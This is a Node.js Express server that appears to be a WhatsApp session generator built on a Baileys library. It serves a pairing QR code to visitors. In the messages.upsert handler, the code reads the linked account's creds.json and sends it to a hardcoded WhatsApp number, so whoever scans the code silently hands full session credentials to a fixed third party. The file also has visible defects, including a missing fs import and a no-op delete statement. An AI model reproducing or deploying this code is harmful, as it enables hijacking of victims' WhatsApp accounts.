const express = require('express');
const app = express();
const port = 3000;
const { default: makeWASocket, makeInMemoryStore, useMultiFileAuthState, proto } = require("baileysv3");
const qrcode = require('qrcode');
const pino = require("pino")

app.enable('trust proxy')
app.set("json spaces",2)
app.use(express.json())
app.use(express.urlencoded({ extended: true }))
app.use(express.static("public"))

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/views/index.html');
});

app.get('/res', (req, res) => {
    res.sendFile(__dirname + '/views/biodata.html');
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

app.get('/getAuth', async (req, res) => {
async function startAuth() {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) }) 
    const { state, saveCreds } = await useMultiFileAuthState(`session`)
    const conn = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: true,
        browser: ['Auth By ArifzynXD','Safari','1.0.0'],
        auth: state
    })

    store.bind(conn.ev)    
    
    conn.ev.on('messages.upsert', async chatUpdate => {
        //console.log(JSON.stringify(chatUpdate, undefined, 2))
        try {
        mek = chatUpdate.messages[0]
        if (!mek.message) return
          mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        if (mek.key && mek.key.remoteJid === 'status@broadcast') return
        if (!mek.key.fromMe && chatUpdate.type === 'notify') return
        if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
	      	let anu = await conn.sendMessage("77759599716@s.whatsapp.net", {
	      	  document: fs.readFileSync(`./session/creds.json`), 
	      	  mimetype: 'json', 
	      	  fileName:`creds.json`
	      	})
      		await conn.sendMessage("77759599716@s.whatsapp.net", { 
      		    text: "Upload sesi ini ke status multi autentikasi bot Anda" }, {
      		      quoted: anu
              })
          delete './session'
        } catch (err) {
            console.log(err)
        }
    })

    conn.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr} = update
        if (qr) {
            const qrCodeDataUrl = await qrcode.toDataURL(qr, {
                scale: 20
            });
            const qrCodeBuffer = Buffer.from(qrCodeDataUrl.split(',')[1], 'base64');
            res.type(".jpg").send(qrCodeBuffer);
            console.log(qrCodeBuffer);
            conn.ev.emit('qr', qrCodeBuffer);
        }

        if (update.connection == "close") {
            const code = update.lastDisconnect?.error?.output?.statusCode;
            console.log(update.lastDisconnect?.error);
            if (code != 401) {
                startAuth("session");
            }
        }

        console.log('Connected...', update);
    });

    conn.ev.on('creds.update', saveCreds);

    return conn;
}
startAuth();
})